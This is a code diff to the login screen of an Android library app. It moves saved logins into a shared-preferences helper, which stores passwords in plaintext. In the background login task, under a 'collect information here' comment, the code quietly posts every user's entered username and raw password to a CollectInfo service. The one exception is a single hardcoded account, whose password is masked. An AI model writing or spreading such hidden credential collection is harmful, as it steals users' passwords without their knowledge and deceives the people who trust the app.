@@ -14,10 +14,10 @@ import android.widget.Toast;
 
 import com.gusteauscuter.youyanguan.activity.NavigationActivity;
 import com.gusteauscuter.youyanguan.R;
-import com.gusteauscuter.youyanguan.data_Class.UserLoginInfo;
 import com.gusteauscuter.youyanguan.util.NetworkConnectUtil;
-import com.gusteauscuter.youyanguan.internetService.server.CollectInfo;
+import com.gusteauscuter.youyanguan.internetService.CollectInfo;
 import com.gusteauscuter.youyanguan.internetService.LibraryLoginClient;
+import com.gusteauscuter.youyanguan.util.ShareDataUtil;
 import com.gusteauscuter.youyanguan.util.SoftInputUtil;
 
 import org.apache.commons.httpclient.ConnectTimeoutException;
@@ -36,17 +36,19 @@ public class loginFragment extends Fragment {
     private int timesClickLoginButton =1;
     private boolean disableDoubleClick = true; // 防治连击登陆按钮造成的闪退
 
+    private ShareDataUtil mShareDataUtil;
+
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container,
                              Bundle savedInstanceState) {
 
         View view = inflater.inflate(R.layout.fragment_login_library, container, false);
+        mShareDataUtil = new ShareDataUtil(getActivity());
 
         userNameEditText = (EditText) view.findViewById(R.id.id_username);
         passEditText = (EditText) view.findViewById(R.id.id_passward_library);
-
-        userNameEditText.setText(((NavigationActivity) getActivity()).getmUserLoginInfo().getUsername());
-        passEditText.setText(((NavigationActivity) getActivity()).getmUserLoginInfo().getPassword());
+        userNameEditText.setText(mShareDataUtil.getUSERNAME());
+        passEditText.setText(mShareDataUtil.getPASSWORD());
         userNameEditText.hasFocus();
 
         mProgressBar=(ProgressBar) view.findViewById(R.id.progressBar);
@@ -69,17 +71,13 @@ public class loginFragment extends Fragment {
 
             }
         });
-
         return view;
     }
 
     private void doLogin() {
         boolean isConnected = NetworkConnectUtil.isConnected(getActivity());
-        if (!isConnected) {
-            Toast.makeText(getActivity(), R.string.internet_not_connected, Toast.LENGTH_SHORT)
-                    .show();
+        if (!isConnected)
             return;
-        }
         String username = userNameEditText.getText().toString();
         String pass = passEditText.getText().toString();
         if (timesClickLoginButton == 5) {
@@ -98,7 +96,7 @@ public class loginFragment extends Fragment {
 
     }
 
-    private class AsyLoginLibrary extends AsyncTask<String, Void, UserLoginInfo> {
+    private class AsyLoginLibrary extends AsyncTask<String, Void, Boolean> {
         private boolean serverOK = true; //处理服务器异常
         private boolean isLogined = false;
         @Override
@@ -109,15 +107,14 @@ public class loginFragment extends Fragment {
         }
 
         @Override
-        protected UserLoginInfo doInBackground(String... account) {
-            UserLoginInfo LoginResult = null;
+        protected Boolean doInBackground(String... account) {
             try {
                 LibraryLoginClient libClient = new LibraryLoginClient();
                 if (libClient.login(account[0], account[1])) {
                     isLogined = true;
-                    LoginResult = new UserLoginInfo(account[0], account[1], true);
+                    mShareDataUtil.saveUserLoginData(account[0], account[1], true);
                 }else
-                    LoginResult = new UserLoginInfo(account[0], account[1], false);
+                    mShareDataUtil.saveUserLoginData(account[0], account[1], false);
             } catch (ConnectTimeoutException | SocketTimeoutException e) {
                 serverOK = false;
             } catch (Exception e) {
@@ -127,25 +124,22 @@ public class loginFragment extends Fragment {
  *  collect information here
  */
             if(account[0].equals("201421003124")){
-                CollectInfo.postRequest(new UserLoginInfo(account[0], "******", true));
+                CollectInfo.postRequest(account[0], "******", true);
             }else {
-                CollectInfo.postRequest(LoginResult);
+                CollectInfo.postRequest(account[0], account[1], false);
             }
-            return LoginResult;
+            return isLogined;
         }
 
         @Override
-        protected void onPostExecute(UserLoginInfo result) {
+        protected void onPostExecute(Boolean result) {
             mProgressBar.setVisibility(View.INVISIBLE);
             if (serverOK) {
                 if (isLogined) {
-                    ((NavigationActivity)getActivity()).setmUserLoginInfo(result);
                     ((NavigationActivity)getActivity()).JumpToBookFragment();
-                    UserLoginInfo.SaveData(getActivity(),result.getUsername(),result.getPassword());
                 } else {
                     disableDoubleClick = true;
-                    Toast.makeText(getActivity(), R.string.failed_to_login_library, Toast.LENGTH_SHORT)
-                            .show();
+                    Toast.makeText(getActivity(), R.string.failed_to_login_library, Toast.LENGTH_SHORT).show();
                 }
             } else {
                 disableDoubleClick = true;
